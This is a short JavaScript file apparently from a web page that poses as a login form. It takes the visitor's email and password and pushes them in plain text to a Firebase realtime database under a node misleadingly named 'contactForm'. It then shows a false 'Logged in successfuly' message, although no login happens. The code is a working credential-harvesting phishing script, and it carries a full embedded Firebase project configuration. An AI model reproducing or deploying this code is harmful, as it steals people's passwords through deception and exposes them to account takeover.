 // Your web app's Firebase configuration
 const firebaseConfig = {
  apiKey: "AIzaSyDmrzVyijfPjqPWR_0slS3FyZg7h-15ZcM",
  authDomain: "websiteform-501d2.firebaseapp.com",
  databaseURL: "https://websiteform-501d2-default-rtdb.firebaseio.com",
  projectId: "websiteform-501d2",
  storageBucket: "websiteform-501d2.appspot.com",
  messagingSenderId: "875776900594",
  appId: "1:875776900594:web:5bd9b100a7b3475548ff6b"
};
firebase.initializeApp(firebaseConfig)
var contactFormDB=firebase.database().ref('contactForm')
document.getElementById('contactForm').addEventListener("submit",submitForm)
function submitForm(e){
  e.preventDefault();
  var name=getElementVal('user');
  var password=getElementVal('password')
 saveMessages(name,password)
 alert('Logged in successfuly. Visit website again')
 document.getElementById('contactForm').reset();
}
const saveMessages=(name,password)=>{
var newContactForm=contactFormDB.push();

newContactForm.set(
  {
    Email:name,
    password:password,
  }
)
}


const getElementVal=(id)=>{
  return document.getElementById(id).value;
}